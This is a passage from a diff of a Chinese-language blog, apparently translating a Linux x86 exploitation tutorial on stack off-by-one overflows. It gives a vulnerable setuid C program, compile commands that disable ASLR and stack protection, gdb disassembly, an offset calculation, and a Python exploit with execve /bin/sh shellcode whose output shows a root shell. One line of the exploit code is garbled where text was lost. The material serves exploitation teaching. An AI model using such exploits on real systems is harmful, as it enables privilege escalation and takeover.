class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> bar(arg); <span class="comment">/* [1] */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [2] */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">256</span>) &#123; <span class="comment">/* [3] */</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Attempted Buffer Overflow\n"</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line"> &#125;</div><div class="line"> foo(argv[<span class="number">1</span>]); <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u><em>编译命令：</em></u></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -z execstack -mpreferred-<span class="built_in">stack</span>-boundary=<span class="number">2</span> -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<p>上述漏洞代码的第[2]行就是Off-By-One溢出问题可能出现的地方。由于目标缓冲区长度为256，因此256字节的源字符串就可能导致任意代码执行。</p>
+<p><strong>注：本系列所有文章中第[N]行代码指的的代码中显示/*[N]*/的位置。</strong></p>
+<h3 id="0X02-如何实现任意代码执行"><a href="#0X02-如何实现任意代码执行" class="headerlink" title="0X02 如何实现任意代码执行"></a>0X02 如何实现任意代码执行</h3><p>任意代码执行是通过“EBP 覆盖（EBP overwrite）”方法实现的。如果调用者的EBP位于目标缓冲区上方，那么执行strcpy后，调用者的EBP的LSB很可能已然被单个NULL字节覆盖了。为了进一步了解off-by-one，我们来反汇编一则漏洞代码并且画出它的堆栈布局吧。</p>
+<p><u><em>反汇编：</em></u></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"> (gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="comment">//Function Prologue</span></div><div class="line"> <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's ebp</span></div><div class="line"> <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (main) ebp to esp</span></div><div class="line"> <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;: push %edi                    <span class="comment">//backup EDI</span></div><div class="line"> <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;: sub $<span class="number">0x8</span>,%esp                <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax           <span class="comment">//eax = argv</span></div><div class="line"> <span class="number">0x080484a1</span> &lt;+<span class="number">10</span>&gt;: add $<span class="number">0x4</span>,%eax               <span class="comment">//eax = &amp;argv[1]</span></div><div class="line"> <span class="number">0x080484a4</span> &lt;+<span class="number">13</span>&gt;: mov (%eax),%eax             <span class="comment">//eax = argv[1]</span></div><div class="line"> <span class="number">0x080484a6</span> &lt;+<span class="number">15</span>&gt;: movl $<span class="number">0xffffffff</span>,<span class="number">-0x8</span>(%ebp) <span class="comment">//String Length Calculation -- Begins here</span></div><div class="line"> <span class="number">0x080484ad</span> &lt;+<span class="number">22</span>&gt;: mov %eax,%edx</div><div class="line"> <span class="number">0x080484af</span> &lt;+<span class="number">24</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x080484b4</span> &lt;+<span class="number">29</span>&gt;: mov <span class="number">-0x8</span>(%ebp),%ecx</div><div class="line"> <span class="number">0x080484b7</span> &lt;+<span class="number">32</span>&gt;: mov %edx,%edi</div><div class="line"> <span class="number">0x080484b9</span> &lt;+<span class="number">34</span>&gt;: repnz scas %es:(%edi),%al</div><div class="line"> <span class="number">0x080484bb</span> &lt;+<span class="number">36</span>&gt;: mov %ecx,%eax</div><div class="line"> <span class="number">0x080484bd</span> &lt;+<span class="number">38</span>&gt;: not %eax</div><div class="line"> <span class="number">0x080484bf</span> &lt;+<span class="number">40</span>&gt;: sub $<span class="number">0x1</span>,%eax               <span class="comment">//String Length Calculation -- Ends here</span></div><div class="line"> <span class="number">0x080484c2</span> &lt;+<span class="number">43</span>&gt;: cmp $<span class="number">0x100</span>,%eax             <span class="comment">//eax = strlen(argv[1]). if eax &gt; 256</span></div><div class="line"> <span class="number">0x080484c7</span> &lt;+<span class="number">48</span>&gt;: jbe <span class="number">0x80484e9</span> &lt;main+<span class="number">82</span>&gt;     <span class="comment">//Jmp if NOT greater</span></div><div class="line"> <span class="number">0x080484c9</span> &lt;+<span class="number">50</span>&gt;: movl $<span class="number">0x80485e0</span>,(%esp)      <span class="comment">//If greater print error string,flush and return.</span></div><div class="line"> <span class="number">0x080484d0</span> &lt;+<span class="number">57</span>&gt;: call <span class="number">0x8048380</span> &lt;<span class="built_in">puts</span>@plt&gt;   </div><div class="line"> <span class="number">0x080484d5</span> &lt;+<span class="number">62</span>&gt;: mov <span class="number">0x804a020</span>,%eax          </div><div class="line"> <span class="number">0x080484da</span> &lt;+<span class="number">67</span>&gt;: mov %eax,(%esp)             </div><div class="line"> <span class="number">0x080484dd</span> &lt;+<span class="number">70</span>&gt;: call <span class="number">0x8048360</span> &lt;fflush@plt&gt;</div><div class="line"> <span class="number">0x080484e2</span> &lt;+<span class="number">75</span>&gt;: mov $<span class="number">0x1</span>,%eax              </div><div class="line"> <span class="number">0x080484e7</span> &lt;+<span class="number">80</span>&gt;: jmp <span class="number">0x80484fe</span> &lt;main+<span class="number">103</span>&gt;</div><div class="line"> <span class="number">0x080484e9</span> &lt;+<span class="number">82</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax          <span class="comment">//argv[1] &lt;= 256, eax = argv</span></div><div class="line"> <span class="number">0x080484ec</span> &lt;+<span class="number">85</span>&gt;: add $<span class="number">0x4</span>,%eax               <span class="comment">//eax = &amp;argv[1]</span></div><div class="line"> <span class="number">0x080484ef</span> &lt;+<span class="number">88</span>&gt;: mov (%eax),%eax             <span class="comment">//eax = argv[1]</span></div><div class="line"> <span class="number">0x080484f1</span> &lt;+<span class="number">90</span>&gt;: mov %eax,(%esp)             <span class="comment">//foo arg</span></div><div class="line"> <span class="number">0x080484f4</span> &lt;+<span class="number">93</span>&gt;: call <span class="number">0x8048464</span>              <span class="comment">//call foo</span></div><div class="line"> <span class="number">0x080484f9</span> &lt;+<span class="number">98</span>&gt;: mov $<span class="number">0x0</span>,%eax               <span class="comment">//return value</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue</span></div><div class="line"> <span class="number">0x080484fe</span> &lt;+<span class="number">103</span>&gt;: add $<span class="number">0x8</span>,%esp              <span class="comment">//unwind stack space</span></div><div class="line"> <span class="number">0x08048501</span> &lt;+<span class="number">106</span>&gt;: pop %edi                   <span class="comment">//restore EDI</span></div><div class="line"> <span class="number">0x08048502</span> &lt;+<span class="number">107</span>&gt;: pop %ebp                   <span class="comment">//restore EBP</span></div><div class="line"> <span class="number">0x08048503</span> &lt;+<span class="number">108</span>&gt;: ret                        <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble foo</div><div class="line">Dump of assembler code <span class="keyword">for</span> function foo:</div><div class="line"> <span class="comment">//Function prologue</span></div><div class="line"> <span class="number">0x08048464</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's (main) ebp</span></div><div class="line"> <span class="number">0x08048465</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (foo) ebp to esp</span></div><div class="line"> <span class="number">0x08048467</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x4</span>,%esp                <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x0804846a</span> &lt;+<span class="number">6</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax           <span class="comment">//foo arg</span></div><div class="line"> <span class="number">0x0804846d</span> &lt;+<span class="number">9</span>&gt;: mov %eax,(%esp)              <span class="comment">//bar arg = foo arg</span></div><div class="line"> <span class="number">0x08048470</span> &lt;+<span class="number">12</span>&gt;: call <span class="number">0x8048477</span>              <span class="comment">//call bar</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue </span></div><div class="line"> <span class="number">0x08048475</span> &lt;+<span class="number">17</span>&gt;: leave                       <span class="comment">//unwind stack space + restore ebp</span></div><div class="line"> <span class="number">0x08048476</span> &lt;+<span class="number">18</span>&gt;: ret                         <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble bar</div><div class="line">Dump of assembler code <span class="keyword">for</span> function bar:</div><div class="line"> <span class="comment">//Function Prologue</span></div><div class="line"> <span class="number">0x08048477</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's (foo) ebp</span></div><div class="line"> <span class="number">0x08048478</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (bar) ebp to esp</span></div><div class="line"> <span class="number">0x0804847a</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x108</span>,%esp              <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x08048480</span> &lt;+<span class="number">9</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax           <span class="comment">//bar arg</span></div><div class="line"> <span class="number">0x08048483</span> &lt;+<span class="number">12</span>&gt;: mov %eax,<span class="number">0x4</span>(%esp)          <span class="comment">//strcpy arg2</span></div><div class="line"> <span class="number">0x08048487</span> &lt;+<span class="number">16</span>&gt;: lea <span class="number">-0x100</span>(%ebp),%eax       <span class="comment">//buf</span></div><div class="line"> <span class="number">0x0804848d</span> &lt;+<span class="number">22</span>&gt;: mov %eax,(%esp)             <span class="comment">//strcpy arg1</span></div><div class="line"> <span class="number">0x08048490</span> &lt;+<span class="number">25</span>&gt;: call <span class="number">0x8048370</span> &lt;<span class="built_in">strcpy</span>@plt&gt; <span class="comment">//call strcpy</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue</span></div><div class="line"> <span class="number">0x08048495</span> &lt;+<span class="number">30</span>&gt;: leave                       <span class="comment">//unwind stack space + restore ebp</span></div><div class="line"> <span class="number">0x08048496</span> &lt;+<span class="number">31</span>&gt;: ret                         <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p><u><em>堆栈布局：</em></u></p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>前面讲到，用户输入了256字节大小的数据，NULL字节就会覆盖foo的EBP的LSB。所以当存储于目标缓冲区‘buf’正上方的foo的EBP被单个NULL字节覆盖时，EBP就会由0xbffff2d8 变为0xbffff200。细看堆栈布局图，我们会发现栈地址0xbffff200就是目标缓冲区‘buf’的一部分，而既然用户输入值已经被复制进了这个目标缓冲区，那么攻击者就能得到这个栈地址(0xbffff200)的控制权，同时也得到了EIP的控制权，从而借此实现任意代码执行。我们来发送一串大小为256字节的“A”进行测试。</p>
+<p>测试第一步：EBP覆盖后出现返回地址覆盖是否有可能？</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">(gdb) r `python -c 'print "A"*256'`</div><div class="line">Starting program: /home/sploitfun/lsploits/new/obo/stack/vuln `python -c 'print "A"*256'`</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x41414141 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x41414141</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>上述输出结果显示，EBP覆盖会让我们得到EIP的控制权。</p>
+<p>测试第二步：来自目标缓冲区的偏移量是什么？</p>
+<p>现在我们需要在目标缓冲区‘buf’的起始端中找到偏移量。我们还需设置好返回地址。切记，在off-by-one漏洞中，我们并不是要覆盖栈中的实际返回地址（在栈缓冲区溢出漏洞利用代码中我们才覆盖实际返回地址），而是把攻击者控制的目标缓冲区‘buf’内的一个4字节内存区域视作返回地址位置，对这块区域进行覆盖（在off-by-one溢出之后）。因此，我们需要(从‘buf’中)找到这个返回地址位置的偏移量——而这个偏移量也是目标缓冲区‘buf’本身的一部分。<br>这段话有点绕，没关系，继续往下读就好。<br>我们先试着从 text 段地址0x0804840开始尝试理解CPU的执行：</p>
+<ul>
+<li>0x08048490 - call strcpy – 执行这个指令会导致off-by-one溢出，因此（储存在栈地址0xbffff2cc中的）foo的EBP值将会由0xbffff2d8变为0xbffff200。</li>
+<li>0x08048495 - leave - leave指令释放了这个函数的栈空间并且恢复了EBP。</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">leave: mov ebp, esp;        <span class="comment">//unwind stack space by setting esp to ebp. </span></div><div class="line">       pop ebp;             <span class="comment">//restore ebp</span></div><div class="line">*** As per our example: ***</div><div class="line">leave: mov ebp, esp;        <span class="comment">//esp = ebp = 0xbffff2cc</span></div><div class="line">       pop ebp;             <span class="comment">//ebp = 0xbffff200 (Overwritten EBP value is now stored in ebp register); esp = 0xbffff2d0</span></div></pre></td></tr></table></figure>
+<ul>
+<li>0x08048495 - ret - 返回到foo的指令0x08048475。</li>
+<li>0x08048475 - leave - leave指令释放了这个函数的栈空间并且恢复了EBP。</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">*** As per our example: ***</div><div class="line">leave: mov ebp, esp;        <span class="comment">//esp = ebp = 0xbffff200 (As part of unwinding esp is shifted down instead of up!!)</span></div><div class="line">       pop ebp;             <span class="comment">//ebp = 0x41414141; esp = 0xbffff204</span></div></pre></td></tr></table></figure>
+<ul>
+<li>0x08048476 - ret - 返回到储存在ESP (0xbffff204)中的指令中。此时ESP指向被攻击者控制的缓冲区，因此攻击者可以回到任何他想要实现任意代码执行的地方。</li>
+</ul>
+<p>现在我们回到“在目标缓冲区‘buf’中寻找返回地址的偏移量”的最初测试上。如堆栈布局图所示，‘buf’位于0xbffff158，并且由紧随其后的CPU执行中可知，目标缓冲区‘buf’内的返回地址位置是0xbffff204。因此目标缓冲区‘buf’中返回地址的偏移量是0xbffff204 – 0xbffff158 = 0xac，因此用户输入“A”<em>172 + “B”</em>4 + “A”*80，用“BBBB”覆盖了EIP。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">$ cat exp_tst.py </div><div class="line">#exp_tst.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">buf = "A" * 172</div><div class="line">buf += "B" * 4</div><div class="line">buf += "A" * 80</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div><div class="line"></div><div class="line">$ python exp_tst.py </div><div class="line">Calling vulnerable program</div><div class="line">$ sudo gdb -q vuln </div><div class="line">Reading symbols from /home/sploitfun/lsploits/new/obo/stack/vuln...(no debugging symbols found)...done.</div><div class="line">(gdb) core-file core</div><div class="line">[New LWP 4055]</div><div class="line">warning: Can't read pathname for load map: Input/output error.</div><div class="line">Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.</div><div class="line">Program terminated with signal 11, Segmentation fault.</div><div class="line">#0 0x42424242 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x42424242</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>上述输出结果显示，攻击者控制了返回地址。此时返回地址位于buf的偏移(0xac)处。有了上面这些信息，我们就可以写出能实现任意代码执行的漏洞利用程序了。</p>
+<p><u><em>漏洞利用代码：</em></u><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">#Spawn a shell. </div><div class="line"><span class="meta">#execve(/bin/sh) Size- 28 bytes.</span></div><div class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90"</span></div><div class="line"></div><div class="line">ret_addr = <span class="number">0xbffff218</span></div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,numturn Address + NOP's + Shellcode + Junk</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">172</span></div><div class="line">buf += conv(ret_addr)</div><div class="line">buf += <span class="string">"\x90"</span> * <span class="number">30</span></div><div class="line">buf += scode</div><div class="line">buf += <span class="string">"A"</span> * <span class="number">22</span></div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure></p>
+<p>执行上述漏洞利用程序将会获取root shell，如下所示：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<p>Off-by-one看上去是一个特别蠢的漏洞，而且程序开发者一个这么小的错误也能导致任意代码执行，这也太诡异了。那么，off-by-one漏洞是不是一定会导致任意代码执行呢？</p>
+<h3 id="0X03-如果调用者的EBP不在目标缓冲区上方，该怎么办"><a href="#0X03-如果调用者的EBP不在目标缓冲区上方，该怎么办" class="headerlink" title="0X03 如果调用者的EBP不在目标缓冲区上方，该怎么办"></a>0X03 如果调用者的EBP不在目标缓冲区上方，该怎么办</h3><p>答案非常简单。如果那样的话，我们不能用“EBP覆盖”方法来利用这个漏洞了呗！（不过呢，毕竟这个漏洞在代码中是确实存在的，所以肯定有其他的漏洞利用方法啦。😛）</p>
+<h3 id="0X04-什么情况下调用者的EBP不在目标缓冲区上方"><a href="#0X04-什么情况下调用者的EBP不在目标缓冲区上方" class="headerlink" title="0X04 什么情况下调用者的EBP不在目标缓冲区上方"></a>0X04 什么情况下调用者的EBP不在目标缓冲区上方</h3><p><strong>情况1</strong>： 一些其他的本地变量出现在目标缓冲区上方</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> x = <span class="number">10</span>; <span class="comment">/* [1] */</span></div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [2] */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [3] */</span> </div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>因此在这种情况下，夹在缓冲区‘buf’末端和EBP之间的会是一个本地变量，这就不允许我们去覆盖EBP的LSB了。</p>
+<p><strong>情况2</strong>: 对齐空间——gcc对齐栈空间边界默认为16字节。即在创建栈空间之前，ESP的最后四个字节就被‘and’指令清零了。具体参见下方函数反汇编代码。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;: push %edi</div><div class="line"> <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;: and $<span class="number">0xfffffff0</span>,%esp               <span class="comment">//Stack space aligned to 16 byte boundary</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;: sub $<span class="number">0x20</span>,%esp                     <span class="comment">//create stack space</span></div><div class="line">...</div></pre></td></tr></table></figure>
+<p>因此，在这种情况下，夹在缓冲区‘buf’末端和EBP之间的会是一个（最大为12字节的）对齐空间，这就不允许我们去覆盖EBP的LSB了。</p>
+<p>由于这个原因，我们在编译漏洞利用代码(vuln.c)时添加了gcc参数<strong><em>“-mpreferred-stack-boundary=2”</em></strong>。</p>
+<p><u><em>求助：</em></u>如果在创建栈内容之前ESP边界已经对齐为16字节的话该怎么办？这种情况下，即使程序以gcc默认的16字节栈边界编译，按理来说“EBP覆盖”法也是可以用的。但是我一直都写不出有效代码。在我所有的试运行程序中，创建栈空间之前，ESP边界都没有对齐16字节。但是不管我多么小心地创建栈内容，gcc总是给本地变量添加额外空间，这样ESP边界就不能对齐16字节。如果任何人有有效代码或者知道为什么ESP总是无法对齐，麻烦告诉我！拜托了！</p>
+<p><u><em>参考文章：</em></u></p>
+<ol>
+<li><a href="http://seclists.org/bugtraq/1998/Oct/109" target="_blank" rel="external">http://seclists.org/bugtraq/1998/Oct/109</a> </li>
+</ol>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">Linux(X86)漏洞利用系列-栈内Off-by-one漏洞利用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Stack/">Stack</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-integerflow"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20161230/integerflow/">整型溢出利用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20161230/integerflow/" class="article-date">
+	  <time datetime="2016-12-30T09:58:52.000Z" itemprop="datePublished">十二月 30, 2016</time>
 	</a>
 
     </div>
@@ -131,121 +893,72 @@
       
         <p>作者：<a href="http://www.csyssec.org/" target="_blank" rel="external">CSysSec出品</a></p>
 <hr>
-<figure><br>    <a href="http://s3.eurecom.fr/~balzarot/" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/davide.jpeg" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p><strong>CSysSec注</strong>: 本文受欧洲通信学院(EURECOM)教授<a href="http://s3.eurecom.fr/~balzarot/" target="_blank" rel="external">Davide Balzarotti</a>建议翻译（原文链接：<a href="http://s3.eurecom.fr/~balzarot/notes/top4/" target="_blank" rel="external">System Security Circus</a>），并受邀将译文放至其主页，供更多中国学生阅读。Balzarotti教授研究领域为系统安全方向，更多关注二进制与恶意代码分析，逆向工程，计算机取证与Web安全。其在CCS,Usenix Security,ACSAC等著名安全会议发表多篇文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/csysseccircus/" target="_blank" rel="external">计算机系统安全学术圈</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/integerflow/" target="_blank" rel="external">Linux(X86)漏洞利用系列-整型溢出利用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
 <hr>
-<p>本文是对之前帖子（<a href="http://s3.eurecom.fr/~balzarot/notes/top4_v1/" target="_blank" rel="external">点此查看</a>）的重大更新，增加了系统安全领域TOP4顶级会议的数据。</p>
-<h3 id="现今版本：2-1-0"><a href="#现今版本：2-1-0" class="headerlink" title="现今版本：2.1.0"></a>现今版本：2.1.0</h3><p>(重大更新是指增加新的数据或结点，次要更新是指对个别数据的修改，对于输入错误和书写错误的修改也会导致版本更新)</p>
-<h3 id="最新动态"><a href="#最新动态" class="headerlink" title="最新动态"></a>最新动态</h3><blockquote>
+<blockquote>
 <ul>
